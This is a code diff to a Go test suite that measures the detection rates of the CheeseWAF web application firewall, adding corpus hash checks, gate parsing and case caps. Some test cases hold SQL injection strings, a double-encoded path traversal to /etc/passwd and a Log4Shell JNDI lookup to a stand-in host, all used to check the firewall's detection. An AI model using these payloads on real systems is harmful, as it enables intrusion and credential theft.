@@ -4,9 +4,13 @@ import (
 	"bytes"
 	"compress/gzip"
 	"context"
+	"crypto/sha256"
+	"encoding/hex"
 	"encoding/json"
+	"errors"
 	"fmt"
 	"io"
+	"math"
 	"net/http"
 	"os"
 	"path/filepath"
@@ -17,7 +21,7 @@ import (
 	"time"
 
 	"github.com/LaokeQwQ/CheeseWAF/internal/engine"
-	"github.com/LaokeQwQ/CheeseWAF/internal/securitytest"
+	"github.com/LaokeQwQ/CheeseWAF/internal/security"
 )
 
 // TestEvaluationPlatform provides a quantitative FPR/TPR measurement framework
@@ -32,9 +36,10 @@ import (
 // - Failed sample details for debugging
 //
 // In -short mode (CI) the large external dataset and the per-paranoia-level
-// sweep are skipped, but the curated corpus and mined probe still run so that
-// FPR_GATE / TPR_GATE remain real quality gates. Do NOT add a top-level
-// t.Skip here: it silently turns the CI gate into a no-op.
+// sweep are skipped, but the curated corpus and optional mined probe still run
+// so that FPR_GATE / TPR_GATE remain real quality gates. The standalone mined
+// probe test is report-only and has its own short-mode opt-in. Do NOT add a
+// top-level t.Skip here: it silently turns the CI gate into a no-op.
 func TestEvaluationPlatform(t *testing.T) {
 	ProcessMetrics().ResetForTest()
 	ResetProcessCacheForTest()
@@ -54,6 +59,23 @@ func TestEvaluationPlatform(t *testing.T) {
 		{name: "curated_corpus", benignPath: "testdata/curated_external_shapes.jsonl", required: true, skipShort: false},
 		{name: "mined_probe", benignPath: "testdata/mined_secprose_probe.jsonl", required: false, skipShort: false},
 		{name: "external_dataset", benignPath: "testdata/cybersec_benign_clean.jsonl", attackPath: "testdata/cybersec_attack_clean.jsonl", required: false, skipShort: true},
+	}
+	governedMode := false
+	if governedPath := strings.TrimSpace(os.Getenv("SEMANTIC_EVAL_GOVERNED_CORPUS")); governedPath != "" {
+		manifestPath := strings.TrimSpace(os.Getenv("SEMANTIC_EVAL_GOVERNANCE_MANIFEST"))
+		if manifestPath == "" {
+			t.Fatal("SEMANTIC_EVAL_GOVERNANCE_MANIFEST is required with SEMANTIC_EVAL_GOVERNED_CORPUS")
+		}
+		verifyGovernedSnapshot(t, governedPath, manifestPath)
+		governedMode = true
+		dataSources = dataSources[:0]
+		dataSources = append(dataSources, struct {
+			name       string
+			benignPath string
+			attackPath string
+			required   bool
+			skipShort  bool
+		}{name: "governed_formal_snapshot", benignPath: governedPath, required: true})
 	}
 
 	report := &EvaluationReport{
@@ -76,7 +98,7 @@ func TestEvaluationPlatform(t *testing.T) {
 			processDataSourceSplit(t, analyzer, ds.name, ds.benignPath, ds.attackPath, ds.required, report)
 		} else {
 			// Process single file with mixed labels
-			processDataSource(t, analyzer, ds.name, ds.benignPath, ds.required, report)
+			processDataSource(t, analyzer, ds.name, ds.benignPath, ds.required, governedMode, report)
 		}
 	}
 
@@ -100,23 +122,124 @@ func TestEvaluationPlatform(t *testing.T) {
 	// Output JSON report
 	outputReport(t, report)
 
-	// Validation gates (optional - controlled by env vars)
-	if os.Getenv("FPR_GATE") != "" {
-		maxFPR := 0.0
-		if _, err := fmt.Sscanf(os.Getenv("FPR_GATE"), "%f", &maxFPR); err == nil {
-			if report.Overall.FPR > maxFPR {
-				t.Fatalf("FPR gate failed: %.4f%% > %.4f%%", report.Overall.FPR, maxFPR)
-			}
+	applyEvaluationGates(t, report)
+}
+
+func applyEvaluationGates(t *testing.T, report *EvaluationReport) {
+	t.Helper()
+	maxFPR, fprEnabled, err := percentGateFromEnv("FPR_GATE")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if fprEnabled {
+		minimum := positiveEnvInt(t, "FPR_MIN_BENIGN", 100)
+		if sumBenign(report.Sources) < minimum {
+			t.Fatalf("FPR gate requires at least %d benign samples, got %d", minimum, sumBenign(report.Sources))
+		}
+		// The acceptance target is strictly below the configured ceiling.
+		if report.Overall.FPR >= maxFPR {
+			t.Fatalf("FPR gate failed: %.4f%% is not below %.4f%%", report.Overall.FPR, maxFPR)
 		}
 	}
 
-	if os.Getenv("TPR_GATE") != "" {
-		minTPR := 0.0
-		if _, err := fmt.Sscanf(os.Getenv("TPR_GATE"), "%f", &minTPR); err == nil {
-			if report.Overall.TPR < minTPR {
-				t.Fatalf("TPR gate failed: %.4f%% < %.4f%%", report.Overall.TPR, minTPR)
-			}
+	minTPR, tprEnabled, err := percentGateFromEnv("TPR_GATE")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if tprEnabled {
+		minimum := positiveEnvInt(t, "TPR_MIN_ATTACK", 100)
+		if sumAttack(report.Sources) < minimum {
+			t.Fatalf("TPR gate requires at least %d attack samples, got %d", minimum, sumAttack(report.Sources))
 		}
+		if report.Overall.TPR < minTPR {
+			t.Fatalf("TPR gate failed: %.4f%% < %.4f%%", report.Overall.TPR, minTPR)
+		}
+	}
+}
+
+func positiveEnvInt(t *testing.T, name string, fallback int) int {
+	t.Helper()
+	raw, ok := os.LookupEnv(name)
+	if !ok {
+		return fallback
+	}
+	value, err := strconv.Atoi(strings.TrimSpace(raw))
+	if err != nil || value < 1 {
+		t.Fatalf("%s must be a positive integer, got %q", name, raw)
+	}
+	return value
+}
+
+func verifyGovernedSnapshot(t *testing.T, corpusPath, manifestPath string) {
+	t.Helper()
+	manifestBytes, err := os.ReadFile(manifestPath)
+	if err != nil {
+		t.Fatalf("read governance manifest: %v", err)
+	}
+	var manifest security.GovernanceManifest
+	if err := json.Unmarshal(manifestBytes, &manifest); err != nil {
+		t.Fatalf("parse governance manifest: %v", err)
+	}
+	if manifest.Formal <= 0 || manifest.OutputHashes["formal"] == "" {
+		t.Fatalf("governance manifest has no formal snapshot")
+	}
+	data, err := os.ReadFile(corpusPath)
+	if err != nil {
+		t.Fatalf("read governed corpus: %v", err)
+	}
+	digest := sha256.Sum256(data)
+	if got := hex.EncodeToString(digest[:]); got != manifest.OutputHashes["formal"] {
+		t.Fatalf("governed corpus hash mismatch: got %s want %s", got, manifest.OutputHashes["formal"])
+	}
+	lines := 0
+	for _, line := range bytes.Split(data, []byte{'\n'}) {
+		if len(bytes.TrimSpace(line)) > 0 {
+			lines++
+		}
+	}
+	if lines != manifest.Formal {
+		t.Fatalf("governed corpus line count mismatch: got %d want %d", lines, manifest.Formal)
+	}
+}
+
+func percentGateFromEnv(name string) (value float64, enabled bool, err error) {
+	raw, enabled := os.LookupEnv(name)
+	if !enabled {
+		return 0, false, nil
+	}
+	value, err = parsePercentGate(name, raw)
+	return value, true, err
+}
+
+func parsePercentGate(name, raw string) (float64, error) {
+	value, err := strconv.ParseFloat(strings.TrimSpace(raw), 64)
+	if err != nil || math.IsNaN(value) || math.IsInf(value, 0) || value < 0 || value > 100 {
+		return 0, fmt.Errorf("%s must be a finite percentage in [0, 100], got %q", name, raw)
+	}
+	return value, nil
+}
+
+func TestParsePercentGateRejectsInvalidValues(t *testing.T) {
+	for _, raw := range []string{"", "nope", "NaN", "+Inf", "-0.1", "100.1", "1 trailing"} {
+		if _, err := parsePercentGate("FPR_GATE", raw); err == nil {
+			t.Errorf("parsePercentGate(%q) unexpectedly succeeded", raw)
+		}
+	}
+	for _, raw := range []string{"0", "0.8", " 99 ", "100"} {
+		if _, err := parsePercentGate("TPR_GATE", raw); err != nil {
+			t.Errorf("parsePercentGate(%q): %v", raw, err)
+		}
+	}
+}
+
+func TestPercentGateFromEnvRejectsExplicitBlankValue(t *testing.T) {
+	for _, raw := range []string{"", " ", "\t\n"} {
+		t.Run(strconv.Quote(raw), func(t *testing.T) {
+			t.Setenv("TEST_PERCENT_GATE", raw)
+			if _, enabled, err := percentGateFromEnv("TEST_PERCENT_GATE"); !enabled || err == nil {
+				t.Fatalf("percentGateFromEnv(%q) = enabled %v, err %v; want enabled with an error", raw, enabled, err)
+			}
+		})
 	}
 }
 
@@ -195,7 +318,7 @@ func TestEvaluationDocumentationMatchesModesAndLevels(t *testing.T) {
 	}
 }
 
-func processDataSource(t *testing.T, analyzer *Analyzer, sourceName, path string, required bool, report *EvaluationReport) {
+func processDataSource(t *testing.T, analyzer *Analyzer, sourceName, path string, required, governed bool, report *EvaluationReport) {
 	f, err := openCorpusFile(path)
 	if err != nil {
 		if required {
@@ -209,12 +332,16 @@ func processDataSource(t *testing.T, analyzer *Analyzer, sourceName, path string
 	srcMetrics := &SourceMetrics{}
 	report.Sources[sourceName] = srcMetrics
 
-	err = securitytest.ForEachJSONL(f, evalShardTotal(), evalShardIndex(evalShardTotal()), func(tc securitytest.Case) error {
-		processOneSourceCase(t, analyzer, tc, sourceName, report, srcMetrics)
+	processed := 0
+	err = security.ForEachJSONL(f, evalShardTotal(), evalShardIndex(evalShardTotal()), caseCap(func(tc security.Case) error {
+		processOneSourceCase(t, analyzer, tc, sourceName, governed, report, srcMetrics)
 		return nil
-	})
-	if err != nil {
+	}, &processed, sourceName))
+	if err != nil && !isCapStop(err) {
 		t.Fatalf("Failed to load/stream %s: %v", sourceName, err)
+	}
+	if isCapStop(err) {
+		t.Logf("Capped %s at %d cases (SEMANTIC_EVAL_MAX_CASES=0 evaluates everything)", sourceName, evalMaxCases())
 	}
 
 	// Compute metrics for this source
@@ -234,7 +361,7 @@ func processDataSource(t *testing.T, analyzer *Analyzer, sourceName, path string
 	)
 }
 
-func processOneSourceCase(t *testing.T, analyzer *Analyzer, tc securitytest.Case, sourceName string, report *EvaluationReport, srcMetrics *SourceMetrics) {
+func processOneSourceCase(t *testing.T, analyzer *Analyzer, tc security.Case, sourceName string, governed bool, report *EvaluationReport, srcMetrics *SourceMetrics) {
 	method := tc.Method
 	if method == "" {
 		method = http.MethodGet
@@ -242,6 +369,11 @@ func processOneSourceCase(t *testing.T, analyzer *Analyzer, tc securitytest.Case
 
 	req, err := http.NewRequest(method, tc.Target, strings.NewReader(tc.Body))
 	if err != nil {
+		if governed {
+			t.Errorf("Invalid governed request %s: %v", tc.Name, err)
+		} else {
+			t.Logf("Skipping invalid raw corpus request %s: %v", tc.Name, err)
+		}
 		return
 	}
 
@@ -254,6 +386,11 @@ func processOneSourceCase(t *testing.T, analyzer *Analyzer, tc securitytest.Case
 
 	reqCtx, err := engine.NewRequestContext(req, "default")
 	if err != nil {
+		if governed {
+			t.Errorf("Failed to build governed request context for %s: %v", tc.Name, err)
+		} else {
+			t.Logf("Skipping raw corpus request context %s: %v", tc.Name, err)
+		}
 		return
 	}
 
@@ -498,15 +635,19 @@ func processDataSourceSplit(t *testing.T, analyzer *Analyzer, sourceName, benign
 			t.Logf("Skipping optional benign file %s: %v", benignPath, err)
 		} else {
 			defer f.Close()
-			stats, streamErr := forEachCybersecJSONL(f, "benign", evalShardTotal(), evalShardIndex(evalShardTotal()), func(tc securitytest.Case) error {
+			benignProcessed := 0
+			stats, streamErr := forEachCybersecJSONL(f, "benign", evalShardTotal(), evalShardIndex(evalShardTotal()), caseCap(func(tc security.Case) error {
 				srcMetrics.BenignTotal++
 				if detectSample(t, analyzer, &tc, report, sourceName, "benign") {
 					srcMetrics.BenignFP++
 				}
 				return nil
-			})
-			if streamErr != nil {
+			}, &benignProcessed, sourceName+"/benign"))
+			if streamErr != nil && !isCapStop(streamErr) {
 				t.Fatalf("Failed to stream benign samples from %s: %v", benignPath, streamErr)
+			}
+			if isCapStop(streamErr) {
+				t.Logf("Capped %s/benign at %d cases (SEMANTIC_EVAL_MAX_CASES=0 evaluates everything)", sourceName, evalMaxCases())
 			}
 			if stats.SkippedOverlong > 0 {
 				t.Logf("Skipped %d overlong benign record(s) from %s", stats.SkippedOverlong, benignPath)
@@ -524,7 +665,8 @@ func processDataSourceSplit(t *testing.T, analyzer *Analyzer, sourceName, benign
 			t.Logf("Skipping optional attack file %s: %v", attackPath, err)
 		} else {
 			defer f.Close()
-			stats, streamErr := forEachCybersecJSONL(f, "attack", evalShardTotal(), evalShardIndex(evalShardTotal()), func(tc securitytest.Case) error {
+			attackProcessed := 0
+			stats, streamErr := forEachCybersecJSONL(f, "attack", evalShardTotal(), evalShardIndex(evalShardTotal()), caseCap(func(tc security.Case) error {
 				srcMetrics.AttackTotal++
 				if detectSample(t, analyzer, &tc, report, sourceName, "attack") {
 					srcMetrics.AttackHit++
@@ -540,9 +682,12 @@ func processDataSourceSplit(t *testing.T, analyzer *Analyzer, sourceName, benign
 					report.ByCategory[tc.Category].AttackTotal++
 				}
 				return nil
-			})
-			if streamErr != nil {
+			}, &attackProcessed, sourceName+"/attack"))
+			if streamErr != nil && !isCapStop(streamErr) {
 				t.Fatalf("Failed to stream attack samples from %s: %v", attackPath, streamErr)
+			}
+			if isCapStop(streamErr) {
+				t.Logf("Capped %s/attack at %d cases (SEMANTIC_EVAL_MAX_CASES=0 evaluates everything)", sourceName, evalMaxCases())
 			}
 			if stats.SkippedOverlong > 0 {
 				t.Logf("Skipped %d overlong attack record(s) from %s", stats.SkippedOverlong, attackPath)
@@ -574,8 +719,8 @@ type cybersecEntry struct {
 	Note    string `json:"note"`
 }
 
-func forEachCybersecJSONL(r io.Reader, expectedLabel string, shards, shard int, fn func(securitytest.Case) error) (securitytest.JSONLStats, error) {
-	return securitytest.ForEachJSONLRaw(r, shards, shard, func(line []byte, lineNo int, selected bool) error {
+func forEachCybersecJSONL(r io.Reader, expectedLabel string, shards, shard int, fn func(security.Case) error) (security.JSONLStats, error) {
+	return security.ForEachJSONLRaw(r, shards, shard, func(line []byte, lineNo int, selected bool) error {
 		var entry cybersecEntry
 		if err := json.Unmarshal(line, &entry); err != nil {
 			return fmt.Errorf("line %d: %w", lineNo, err)
@@ -587,7 +732,7 @@ func forEachCybersecJSONL(r io.Reader, expectedLabel string, shards, shard int, 
 		if expectedLabel == "attack" {
 			category = mapLabelToCategory(entry.Label)
 		}
-		tc := securitytest.Case{
+		tc := security.Case{
 			Name:         fmt.Sprintf("cybersec-%d", lineNo),
 			SourceFamily: entry.Source,
 			Label:        expectedLabel,
@@ -608,8 +753,8 @@ func TestForEachCybersecJSONLSkipsOverlongRecordAndKeepsFollowingCase(t *testing
 	t.Setenv("CHEESEWAF_CORPUS_MAX_LINE_BYTES", "128")
 	long := `{"payload":"` + strings.Repeat("x", 512) + `","label":"sqli","source":"oversized"}`
 	valid := `{"payload":"1 UNION SELECT password FROM users--","label":"sqli","source":"unit"}`
-	var got []securitytest.Case
-	stats, err := forEachCybersecJSONL(strings.NewReader(long+"\n"+valid+"\n"), "attack", 1, 0, func(tc securitytest.Case) error {
+	var got []security.Case
+	stats, err := forEachCybersecJSONL(strings.NewReader(long+"\n"+valid+"\n"), "attack", 1, 0, func(tc security.Case) error {
 		got = append(got, tc)
 		return nil
 	})
@@ -625,7 +770,7 @@ func TestParanoiaSweepUsesRawLineShardMembership(t *testing.T) {
 	const shards = 2
 	var corpusLine []byte
 	for i := 0; i < 100; i++ {
-		tc := securitytest.Case{
+		tc := security.Case{
 			Name:   fmt.Sprintf("paranoia-raw-shard-%d", i),
 			Label:  "benign",
 			Method: http.MethodGet,
@@ -635,7 +780,7 @@ func TestParanoiaSweepUsesRawLineShardMembership(t *testing.T) {
 		if err != nil {
 			t.Fatal(err)
 		}
-		if securitytest.ShardIndexForRaw(line, shards) == 0 && securitytest.ShardIndexFor(tc.Name, shards) != 0 {
+		if security.ShardIndexForRaw(line, shards) == 0 && security.ShardIndexFor(tc.Name, shards) != 0 {
 			corpusLine = append(line, '\n')
 			break
 		}
@@ -694,7 +839,7 @@ func mapLabelToCategory(label string) string {
 	}
 }
 
-func detectSample(t *testing.T, analyzer *Analyzer, tc *securitytest.Case, report *EvaluationReport, sourceName, expectedLabel string) bool {
+func detectSample(t *testing.T, analyzer *Analyzer, tc *security.Case, report *EvaluationReport, sourceName, expectedLabel string) bool {
 	method := tc.Method
 	if method == "" {
 		method = http.MethodGet
@@ -802,7 +947,7 @@ func computeByParanoiaLevel(t *testing.T, dataSources []struct {
 			}
 			continue
 		}
-		stats, streamErr := securitytest.ForEachJSONLWithStats(f, shards, shard, func(tc securitytest.Case) error {
+		stats, streamErr := security.ForEachJSONLWithStats(f, shards, shard, func(tc security.Case) error {
 			accumulateParanoiaTotals(t, tc, tc.Label, &totals)
 			return nil
 		})
@@ -856,7 +1001,7 @@ func processCybersecLevels(t *testing.T, ds struct {
 		}
 		return
 	}
-	stats, streamErr := forEachCybersecJSONL(f, label, shards, shard, func(tc securitytest.Case) error {
+	stats, streamErr := forEachCybersecJSONL(f, label, shards, shard, func(tc security.Case) error {
 		accumulateParanoiaTotals(t, tc, label, totals)
 		return nil
 	})
@@ -872,7 +1017,7 @@ func processCybersecLevels(t *testing.T, ds struct {
 	}
 }
 
-func accumulateParanoiaTotals(t *testing.T, tc securitytest.Case, label string, totals *[6]evalLevelTotals) {
+func accumulateParanoiaTotals(t *testing.T, tc security.Case, label string, totals *[6]evalLevelTotals) {
 	t.Helper()
 	hits := detectHitsOnce(t, &tc)
 	for level := 0; level <= 5; level++ {
@@ -890,7 +1035,7 @@ func accumulateParanoiaTotals(t *testing.T, tc securitytest.Case, label string, 
 	}
 }
 
-func detectHitsOnce(t *testing.T, tc *securitytest.Case) []Hit {
+func detectHitsOnce(t *testing.T, tc *security.Case) []Hit {
 	method := tc.Method
 	if method == "" {
 		method = http.MethodGet
@@ -939,51 +1084,51 @@ func TestParanoiaOfflineGradingMatchesOnlineAcrossSampleShapes(t *testing.T) {
 		"--" + multipartBoundary + "--\r\n"
 	tests := []struct {
 		name     string
-		caseData securitytest.Case
+		caseData security.Case
 	}{
 		{
 			name: "uri",
-			caseData: securitytest.Case{Name: "uri", Method: http.MethodGet,
+			caseData: security.Case{Name: "uri", Method: http.MethodGet,
 				Target: "/download/%252e%252e/%252e%252e/etc/passwd"},
 		},
 		{
 			name: "query isolated",
-			caseData: securitytest.Case{Name: "query-isolated", Method: http.MethodGet,
+			caseData: security.Case{Name: "query-isolated", Method: http.MethodGet,
 				Target: "/search?q=1%20UNION%20SELECT%20password%20FROM%20users--"},
 		},
 		{
 			name: "query embedded",
-			caseData: securitytest.Case{Name: "query-embedded", Method: http.MethodGet,
+			caseData: security.Case{Name: "query-embedded", Method: http.MethodGet,
 				Target: "/notes?text=Observed%20%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D%20in%20logs"},
 		},
 		{
 			name: "header",
-			caseData: securitytest.Case{Name: "header", Method: http.MethodGet, Target: "/",
+			caseData: security.Case{Name: "header", Method: http.MethodGet, Target: "/",
 				Header: map[string]string{"X-Query": "1 UNION SELECT password FROM users--"}},
 		},
 		{
 			name: "cookie",
-			caseData: securitytest.Case{Name: "cookie", Method: http.MethodGet, Target: "/",
+			caseData: security.Case{Name: "cookie", Method: http.MethodGet, Target: "/",
 				Header: map[string]string{"Cookie": "query=1%20UNION%20SELECT%20password%20FROM%20users--"}},
 		},
 		{
 			name: "form body",
-			caseData: securitytest.Case{Name: "form", Method: http.MethodPost, Target: "/search",
+			caseData: security.Case{Name: "form", Method: http.MethodPost, Target: "/search",
 				ContentType: "application/x-www-form-urlencoded", Body: "query=1+UNION+SELECT+password+FROM+users--"},
 		},
 		{
 			name: "json body",
-			caseData: securitytest.Case{Name: "json", Method: http.MethodPost, Target: "/search",
+			caseData: security.Case{Name: "json", Method: http.MethodPost, Target: "/search",
 				ContentType: "application/json", Body: `{"query":"1 UNION SELECT password FROM users--"}`},
 		},
 		{
 			name: "raw body",
-			caseData: securitytest.Case{Name: "raw", Method: http.MethodPost, Target: "/search",
+			caseData: security.Case{Name: "raw", Method: http.MethodPost, Target: "/search",
 				ContentType: "text/plain", Body: "1 UNION SELECT password FROM users--"},
 		},
 		{
 			name: "multipart body",
-			caseData: securitytest.Case{Name: "multipart", Method: http.MethodPost, Target: "/search",
+			caseData: security.Case{Name: "multipart", Method: http.MethodPost, Target: "/search",
 				ContentType: "multipart/form-data; boundary=" + multipartBoundary, Body: multipartBody},
 		},
 	}
@@ -1010,7 +1155,7 @@ func TestParanoiaSweepUsesPrimaryEvaluationShardMembership(t *testing.T) {
 	const shards = 2
 	var corpusLine []byte
 	for i := 0; i < 100; i++ {
-		tc := securitytest.Case{
+		tc := security.Case{
 			Name:   fmt.Sprintf("shard-parity-%d", i),
 			Label:  "benign",
 			Method: http.MethodGet,
@@ -1020,7 +1165,7 @@ func TestParanoiaSweepUsesPrimaryEvaluationShardMembership(t *testing.T) {
 		if err != nil {
 			t.Fatal(err)
 		}
-		if securitytest.ShardIndexForRaw(line, shards) == 0 && securitytest.ShardIndexFor(tc.Name, shards) != 0 {
+		if security.ShardIndexForRaw(line, shards) == 0 && security.ShardIndexFor(tc.Name, shards) != 0 {
 			corpusLine = append(line, '\n')
 			break
 		}
@@ -1058,7 +1203,7 @@ func TestParanoiaSweepUsesPrimaryEvaluationShardMembership(t *testing.T) {
 }
 
 // detectSampleQuiet runs block-mode detection without recording failed cases.
-func detectSampleQuiet(analyzer *Analyzer, tc *securitytest.Case) bool {
+func detectSampleQuiet(analyzer *Analyzer, tc *security.Case) bool {
 	method := tc.Method
 	if method == "" {
 		method = http.MethodGet
@@ -1111,6 +1256,51 @@ func evalShardIndex(shards int) int {
 		return 0
 	}
 	return n
+}
+
+// errEvalCaseCapReached stops corpus streaming once the per-source case budget
+// is spent. It is a sentinel: callers check it with errors.Is and treat it as a
+// clean stop rather than a corpus failure.
+var errEvalCaseCapReached = errors.New("evaluation case cap reached")
+
+// evalMaxCases bounds how many cases a non-short run evaluates per source per
+// label. Without it the full cybersec corpus (112MB) never finishes: the test
+// hits its timeout and the external_dataset dimension is effectively never
+// evaluated.
+//
+// Set SEMANTIC_EVAL_MAX_CASES=0 to evaluate everything.
+func evalMaxCases() int {
+	v := strings.TrimSpace(os.Getenv("SEMANTIC_EVAL_MAX_CASES"))
+	if v == "" {
+		return defaultEvalMaxCases
+	}
+	n, err := strconv.Atoi(v)
+	if err != nil || n < 0 {
+		return defaultEvalMaxCases
+	}
+	return n
+}
+
+const defaultEvalMaxCases = 20000
+
+// caseCap wraps a corpus callback with a per-label case budget. Returning
+// errEvalCaseCapReached aborts the stream, so the cap also avoids reading and
+// parsing the rest of a very large file.
+func caseCap(fn func(security.Case) error, counter *int, label string) func(security.Case) error {
+	limit := evalMaxCases()
+	return func(tc security.Case) error {
+		if limit > 0 && *counter >= limit {
+			return fmt.Errorf("%w (%s)", errEvalCaseCapReached, label)
+		}
+		*counter++
+		return fn(tc)
+	}
+}
+
+// isCapStop reports whether err is the clean cap stop rather than a real
+// corpus failure.
+func isCapStop(err error) bool {
+	return errors.Is(err, errEvalCaseCapReached)
 }
 
 type gzipCorpusFile struct {
